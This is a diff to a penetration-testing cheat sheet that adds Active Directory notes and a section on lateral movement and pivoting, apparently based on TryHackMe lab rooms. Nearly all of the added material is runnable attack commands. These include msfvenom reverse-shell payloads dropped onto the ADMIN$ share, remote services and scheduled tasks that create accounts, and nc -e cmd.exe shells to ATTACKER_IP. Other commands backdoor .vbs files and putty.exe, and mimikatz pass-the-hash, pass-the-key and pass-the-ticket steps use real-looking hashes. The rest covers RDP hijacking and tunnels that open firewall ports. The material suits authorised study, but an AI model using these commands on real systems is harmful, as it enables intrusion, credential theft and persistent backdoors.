@@ -220,7 +220,7 @@ I try as much as possible to link to the various sources or inspiration for thes
     - [BloodHound](#bloodhound)
     - [Mimikatz](#mimikatz-1)
     - [Active Directory Authentication Attacks](#active-directory-authentication-attacks)
-    - [Lateral Movement Techniques](#lateral-movement-techniques)
+    - [Lateral Movement Techniques and Pivoting](#lateral-movement-techniques-and-pivoting)
     - [Active Directory Persistence](#active-directory-persistence)
     - [Remote Desktop](#remote-desktop)
 - [Mobile](#mobile)
@@ -5395,17 +5395,6 @@ Example of usage
 ### <ins>Active Directory</ins>
 
 #### <ins>Notes</ins>
-- See also [Cheat Sheet - Active Directory](https://github.com/drak3hft7/Cheat-Sheet---Active-Directory), [Active Directory Exploitation Cheat Sheet](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet) and [Pentesting_Active_directory mindmap](https://web.archive.org/web/20220607072235/https://www.xmind.net/m/5dypm8/)
-- [WADComs](https://wadcoms.github.io/), an interactive cheat sheet
-- Check for `Domain Admins` and `Service Accounts` groups
-- Add an account to a group
-  - `net group "<group>" <user> /add /domain`
-  - Verify the success of the command with `Get-NetGroup "<group>" | select member`
-  - Delete the `<user>` with `/del` instead of `/add`
-- Use `gpp-decrypt` to decrypt a given GPP encrypted string
-- Note `ActiveDirectoryRights` and `SecurityIdentifier` for each object enumerated during [Object Permissions Enumeration](#bbject-permissions-enumeration)
-- The highest permission is `GenericAll`. Note also `GenericWrite`, `WriteOwner`, `WriteDACL`, `AllExtendedRights`, `ForceChangePassword`, `Self (Self-Membership)`
-  - See: [ActiveDirectoryRights Enum (System.DirectoryServices)](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
 
 | Server | Algorithm available |
 | ---    | ---                 |
@@ -5413,6 +5402,53 @@ Example of usage
 | Windows Server 2008 or later | NTLM and SHA-1 |
 | - Old Windows OS (like Windows 7)<br/> - OS that have it manually set | [WDigest](https://technet.microsoft.com/en-us/library/cc778868(v=ws.10).aspx) |
 
+
+**Random notes**
+- Check for `Domain Admins` and `Service Accounts` groups
+- Add an account to a group
+  - `net group "<group>" <user> /add /domain`
+  - Verify the success of the command with `Get-NetGroup "<group>" | select member`
+  - Delete the `<user>` with `/del` instead of `/add`
+- Use `gpp-decrypt` to decrypt a given GPP encrypted string
+- Note `ActiveDirectoryRights` and `SecurityIdentifier` for each object enumerated during [Object Permissions Enumeration](#bbject-permissions-enumeration)
+  - See: [ActiveDirectoryRights Enum (System.DirectoryServices)](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
+
+
+**Cheat sheets**
+- [cheatsheet-active-directory.md](https://github.com/brianlam38/OSCP-2022/blob/main/cheatsheet-active-directory.md(
+- [Cheat Sheet - Active Directory](https://github.com/drak3hft7/Cheat-Sheet---Active-Directory)
+- [Active Directory Exploitation Cheat Sheet](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet)
+- [Active Directory Attack.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md)
+- [HackTricks Active Directory](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology)
+- [Section 18: Active Directory Attacks](https://www.netsecfocus.com/oscp/2021/05/06/The_Journey_to_Try_Harder-_TJnull-s_Preparation_Guide_for_PEN-200_PWK_OSCP_2.0.html#section-18-active-directory-attacks)
+- [Pentesting_Active_directory mindmap](https://web.archive.org/web/20220607072235/https://www.xmind.net/m/5dypm8/)
+- [WADComs](https://wadcoms.github.io/)
+
+
+**Common Terminology**
+- AD Component: trees, forest, domain tree, domain forest
+  https://techiepraveen.wordpress.com/2010/09/04/basic-active-directory-components/
+- https://tryhackme.com/room/attackingkerberos  Task 1
+- More resources:
+  https://tryhackme.com/room/attackingkerberos  Task 9
+
+
+**ACEs**
+- ForceChangePassword: We have the ability to set the user's current password without knowing their current password.
+- AddMembers: We have the ability to add users (including our own account), groups or computers to the target group.
+- GenericAll: We have complete control over the object, including the ability to change the user's password, register an SPN or add an AD object to the target group.
+- GenericWrite: We can update any non-protected parameters of our target object. This could allow us to, for example, update the scriptPath parameter, which would cause a script to execute the next time the user logs on.
+- WriteOwner: We have the ability to update the owner of the target object. We could make ourselves the owner, allowing us to gain additional permissions over the object.
+- WriteDACL: We have the ability to write new ACEs to the target object's DACL. We could, for example, write an ACE that grants our account full control over the target object.
+- AllExtendedRights: We have the ability to perform any action associated with extended AD rights against the target object. This includes, for example, the ability to force change a user's password.
+- The highest permission is `GenericAll`. Note also `GenericWrite`, `WriteOwner`, `WriteDACL`, `AllExtendedRights`, `ForceChangePassword`, `Self (Self-Membership)`
+
+
+**Basics commands**
+- Perform a password reset
+  Set-ADAccountPassword sophie -Reset -NewPassword (Read-Host -AsSecureString -Prompt 'New Password') -Verbose
+- Make user change password next logon
+  Set-ADUser -ChangePasswordAtLogon $true -Identity sophie -Verbose
 
 
 #### <ins>Manual Enumeration</ins>
@@ -5599,7 +5635,11 @@ On Windows
 2. Crack the NTLM hash with `hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`
 
 
-#### <ins>Lateral Movement Techniques</ins>
+#### <ins>Lateral Movement Techniques and Pivoting</ins>
+
+- See: https://tryhackme.com/room/lateralmovementandpivoting
+- `psexec64.exe \\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe`
+- `winrs.exe -r:THMIIS.za.tryhackme.com cmd`
 
 #### WMI and WinRM
 
@@ -5632,6 +5672,142 @@ New-PSSession -ComputerName <IP> -Credential $credential
 ```
 - To interact with the session, run the command `Enter-PSSession <SESSION-ID>`
 
+**Connecting to WMI From Powershell, another process**
+- Create a PSCredential object
+  ```PowerShell
+  $username = 'Administrator';
+  $password = 'Mypass123';
+  $securePassword = ConvertTo-SecureString $password -AsPlainText -Force; 
+  $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
+  ```
+- Enstablish a connection
+  - `Enter-PSSession -Computername TARGET -Credential $credential`
+  - `Invoke-Command -Computername TARGET -Credential $credential -ScriptBlock {whoami}`
+  - ```PowerShell
+    $Opt = New-CimSessionOption -Protocol DCOM
+    $Session = New-Cimsession -ComputerName TARGET -Credential $credential -SessionOption $Opt -ErrorAction Stop
+    $Command = "powershell.exe -Command Set-Content -Path C:\text.txt -Value munrawashere";
+    Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $Command}
+    ```
+- Same process done with wmic.exe
+  - `wmic.exe /user:Administrator /password:Mypass123 /node:TARGET process call create "cmd.exe /c calc.exe"`
+  - `winrs.exe -u:Administrator -p:Mypass123 -r:target cmd`
+- Create Services Remotely with WMI
+  - `Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{Name = "THMService2";DisplayName = "THMService2";PathName = "net user munra2 Pass123 /add";ServiceType = [byte]::Parse("16");StartMode = "Manual" }`
+  - `$Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter "Name LIKE 'THMService2'"`
+  - `Invoke-CimMethod -InputObject $Service -MethodName StartService`
+  - Stop and delete service
+    ```PowerShell
+    Invoke-CimMethod -InputObject $Service -MethodName StopService
+    Invoke-CimMethod -InputObject $Service -MethodName Delete
+    ```
+
+**Creating Scheduled Tasks Remotely with WMI**
+- ```PowerShell
+  $Command = "cmd.exe"
+  $Args = "/c net user munra22 aSdf1234 /add"
+  $Action = New-ScheduledTaskAction -CimSession $Session -Execute $Command -Argument $Args
+  Register-ScheduledTask -CimSession $Session -Action $Action -User "NT AUTHORITY\SYSTEM" -TaskName "THMtask2"
+  Start-ScheduledTask -CimSession $Session -TaskName "THMtask2"
+  Delete unscheduled task
+  ```
+- Unregister-ScheduledTask -CimSession $Session -TaskName "THMtask2"
+
+**Example with WMI**
+1. `msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.50.46.25 LPORT=4445 -f msi > myinstaller.msi`
+2. `smbclient -c 'put myinstaller.msi' -U t1_corine.waters -W ZA '//thmiis.za.tryhackme.com/admin$/' Korine.1994`
+3. `msfconsole -q -x "use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST 10.50.46.25; set LPORT 4445;exploit"`
+4. ```PowerShell
+   $username = 't1_corine.waters';
+   $password = 'Korine.1994';
+   $securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
+   $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
+   $Opt = New-CimSessionOption -Protocol DCOM
+   $Session = New-Cimsession -ComputerName thmiis.za.tryhackme.com -Credential $credential -SessionOption $Opt -ErrorAction Stop
+   ```
+5. `Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}`
+
+#### Remotely Creating Services Using sc
+```Powershell
+sc.exe \\TARGET create THMservice binPath= "net user munra Pass123 /add"
+start= auto
+sc.exe \\TARGET start THMservice
+sc.exe \\TARGET stop THMservice
+sc.exe \\TARGET delete THMservice
+```
+
+#### Creating Scheduled Tasks Remotely
+```Powershell
+schtasks /s TARGET /RU "SYSTEM" /create /tn "THMtask1" /tr "<command/payload to execute>" /sc ONCE /sd 01/01/1970 /st 00:00
+schtasks /s TARGET /run /TN "THMtask1" 
+schtasks /S TARGET /TN "THMtask1" /DELETE /F
+```
+
+#### Spawn process remotely
+1. `msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=10.50.46.25 LPORT=4444 -o myservice.exe`
+2. `smbclient -c 'put myservice.exe' -U t1_leonard.summers -W ZA '//thmiis.za.tryhackme.com/admin$/' EZpass4ever`
+3. `msfconsole -q -x "use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST 10.50.46.25; set LPORT 4444;exploit"`
+4. `nc -lvp 4443`
+
+From the new shell on the listener
+5. `runas /netonly /user:ZA.TRYHACKME.COM\t1_leonard.summers "c:\tools\nc64.exe -e cmd.exe 10.50.46.25 4443"`
+6. `sc.exe \\thmiis.za.tryhackme.com create THMservice-3249 binPath= "%windir%\myservice.exe" start= auto`
+7. `sc.exe \\thmiis.za.tryhackme.com start THMservice-3249`
+
+
+#### Backdooring .vbs Scripts
+- `CreateObject("WScript.Shell").Run "cmd.exe /c copy /Y \\10.10.28.6\myshare\nc64.exe %tmp% & %tmp%\nc64.exe -e cmd.exe <attacker_ip> 1234", 0, True`
+
+#### Backdooring .exe Files
+- `msfvenom -a x64 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=<attacker_ip> lport=4444 -b "\x00" -f exe -o puttyX.exe`
+
+#### RDP hijacking
+1. Run `cmd` as Administrator
+2. `PsExec64.exe -s cmd.exe`
+3. List server's sessions with '`query user`'
+4. Use `tscon.exe` and specify the `session ID` we will be taking over, as well as our current `SESSIONNAME`
+   - `tscon 3 /dest:rdp-tcp#6`
+   
+#### SSH Remote Port Forwarding
+- Victim: `ssh attacker@10.50.46.25 -R 3389:3.3.3.3:3389 -N`
+- Attacker: `xfreerdp /v:127.0.0.1 /u:MyUser /p:MyPassword`
+
+#### SSH Local Port Forwarding (to expose attacker's port 80)
+
+Victim
+1. `ssh tunneluser@1.1.1.1 -L *:80:127.0.0.1:80 -N`
+2. ```Powershell
+   add firewall rule
+   netsh advfirewall firewall add rule name="Open Port 80" dir=in action=allow protocol=TCP localport=80
+   ```
+   
+#### Port Forwarding With socat
+1. Open port `1234` and redirect to port `4321` on host `1.1.1.1`
+   ```Powershell
+   socat TCP4-LISTEN:1234,fork TCP4:1.1.1.1:4321
+   ```
+2. `netsh advfirewall firewall add rule name="Open Port 1234" dir=in action=allow protocol=TCP localport=1234`
+- To expose attacker's port `80`: `socat TCP4-LISTEN:80,fork TCP4:1.1.1.1:80`
+- Example
+  ```Powershell
+  socat TCP4-LISTEN:13389,fork TCP4:THMIIS.za.tryhackme.com:3389
+  xfreerdp /v:THMJMP2.za.tryhackme.com:13389 /u:t1_thomas.moore /p:MyPazzw3rd2020
+  ```
+
+#### Dynamic Port Forwarding and SOCKS
+- Victim: `ssh attacker@10.50.46.25 -R 9050 -N`
+- Attacker: 
+  1. ```
+     [ProxyList]
+     socks4  127.0.0.1 9050
+	 ```
+  2. `proxychains curl http://pxeboot.za.tryhackme.com`
+
+#### Rejetto HFS
+1. `ssh tunneluser@10.50.46.25 -R 8888:thmdc.za.tryhackme.com:80 -L *:6666:127.0.0.1:6666 -L *:7878:127.0.0.1:7878 -N`
+2. `windows/http/rejetto_hfs_exec`
+- See: [Task 7 "Tunnelling Complex Exploits"](https://tryhackme.com/room/lateralmovementandpivoting)
+
 #### PsExec
 ```PowerShell
 ./PsExec64.exe -i  \\<TARGET> -u <DOMAIN>\<USERNAME> -p <PASSWORD> cmd
@@ -5646,12 +5822,28 @@ Requirements
 ```PowerShell
 /usr/bin/impacket-wmiexec -hashes :<hash> <username>@<IP>
 ```
+
+1. Extract hashes
+   ```PowerShell
+   lsadump::sam
+   sekurlsa::msv
+   ```
+3. Perform the PtH
+   ```PowerShell
+   token::revert
+   sekurlsa::pth /user:bob.jenkins /domain:za.tryhackme.com /ntlm:6b4a57f67805a663c818106dc0648484 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5555"
+   ```
+4. On the reverse shell
+   ```PowerShell
+   winrs.exe -r:THMIIS.za.tryhackme.com cmd
+   ```
+
 Requirements
 - An SMB connection through the firewall
 - The `ADMIN$` share must be available
 - The attacker must present valid credentials with local administrative permission
 
-#### Overpass the Hash
+#### Pass the Key / Overpass the Hash
 
 1. Run the Notepad with `Run as different user` to cache the credentials on the machine
 2. Run mimikatz. Execute the commands `privilege::debug` and `sekurlsa::logonpasswords` to dump the password hash for the user just used
@@ -5659,6 +5851,21 @@ Requirements
 4. Authenticate to a network share of the target `net use \\<target>`
 5. Use `klist` to notice the newly requested Kerberos tickets, including a TGT and a TGS for the Common Internet File System (CIFS)
 6. Now you can run `.\PsExec.exe \\<target> cmd`
+
+Process
+1. `sekurlsa::ekeys` 
+2. RC4 hash
+   ```PowerShell
+   sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /rc4:96ea24eff4dff1fbe13818fbf12ea7d8 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
+   AES128 hash
+   sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes128:b65ea8151f13a31d01377f5934bf3883 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
+   AES256 hash
+   sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes256:b54259bbff03af8d37a138c375e29254a2ca0649337cc4c73addcd696b4cdb65 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
+   ```
+4. On the reverse shell
+   ```PowerShell
+   winrs.exe -r:THMIIS.za.tryhackme.com cmd
+   ```
 
 #### Pass the Ticket
 
@@ -5670,6 +5877,11 @@ Requirements
 6. Inspect the injected ticket with `C:\> klist`
 7. Access the restricted shared folder
 
+Process
+1. `sekurlsa::tickets /export`
+2. `kerberos::ptt [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-ZA.TRYHACKME.COM.kirbi`
+3. `klist`
+4. `winrs.exe -r:THMIIS.za.tryhackme.com cmd`
 
 #### DCOM
 
@@ -5697,7 +5909,7 @@ Requirements
 
 
 #### <ins>Remote Desktop</ins>
-```
+```PowerShell
 # enable RDP
 Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0
 
